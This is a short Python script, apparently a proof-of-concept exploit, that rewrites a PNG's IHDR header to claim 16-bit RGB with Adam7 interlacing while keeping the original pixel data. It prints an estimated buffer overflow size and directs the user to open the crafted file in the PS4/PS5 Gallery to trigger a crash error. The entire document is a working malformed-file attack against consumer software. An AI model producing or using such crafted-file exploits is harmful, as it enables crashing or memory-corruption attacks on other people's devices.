import struct
import zlib
import sys

def make_exploit_png(input_png, output_png="poc.png"):
    with open(input_png, "rb") as f:
        data = f.read()

    # Check if it's a valid PNG file
    if not data.startswith(b"\x89PNG\r\n\x1a\n"):
        print("[-] Not a valid PNG file")
        return

    pos = 8
    new_data = data[:8]
    width = 0
    height = 0

    while pos < len(data):
        if pos + 8 > len(data):
            break
        length = struct.unpack(">I", data[pos:pos+4])[0]
        chunk_type = data[pos+4:pos+8]

        if chunk_type == b"IHDR" and length >= 13:
            # Extract width and height
            width = struct.unpack(">I", data[pos+8:pos+12])[0]
            height = struct.unpack(">I", data[pos+12:pos+16])[0]

            # Force 16-bit RGB + Adam7 interlaced
            new_ihdr = struct.pack(">IIBBBBB",
                                 width, height,
                                 16,    # bit depth = 16
                                 2,     # color type = Truecolor (RGB)
                                 0,     # compression method
                                 0,     # filter method
                                 1)     # interlace method = Adam7

            ihdr_chunk = b"IHDR" + new_ihdr
            crc = struct.pack(">I", zlib.crc32(ihdr_chunk) & 0xffffffff)

            new_data += struct.pack(">I", len(new_ihdr)) + ihdr_chunk + crc
            print(f"[+] Modified IHDR → {width}x{height} | 16-bit RGB | Interlaced (Adam7)")

        else:
            # Copy all other chunks unchanged
            chunk_end = pos + 12 + length
            if chunk_end > len(data):
                break
            new_data += data[pos:chunk_end]

        pos += 12 + length
        if chunk_type == b"IEND":
            break

    with open(output_png, "wb") as f:
        f.write(new_data)

    overflow_kb = ((width * height * 6) - (width * height * 4)) / 1024
    print(f"[+] PNG saved: {output_png}")
    print(f"    → Expected overflow size ≈ {overflow_kb:.1f} KB")
    print("    → Open it in PS4 PS5 Gallery → should trigger CE-34196-3 or instant crash")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python make_png.py <original.png>")
        sys.exit(1)
    make_exploit_png(sys.argv[1])
